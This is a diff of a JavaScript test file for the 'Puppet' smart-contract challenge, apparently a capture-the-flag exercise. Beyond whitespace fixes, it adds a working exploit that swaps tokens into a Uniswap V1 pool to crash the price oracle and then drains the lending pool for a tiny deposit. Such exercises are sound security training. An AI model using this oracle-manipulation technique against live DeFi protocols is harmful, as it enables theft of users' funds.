@@ -23,7 +23,7 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
@@ -60,7 +60,7 @@ describe('[Challenge] Puppet', function () {
             this.token.address,
             this.uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -72,7 +72,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
@@ -86,7 +86,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and attacker account
         await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
         await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -103,6 +103,27 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        const depRequiredBefore = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("Before swap deposit required: " + ethers.utils.formatEther(depRequiredBefore))
+
+        // Attack pattern: make ETH balance zero in uniswap exchange
+        const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 minutes from the curr
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+            1,
+            deadline + 1000
+        )
+
+        const depRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("After swap deposit required: " + ethers.utils.formatEther(depRequired))
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depRequired})
     });
 
     after(async function () {
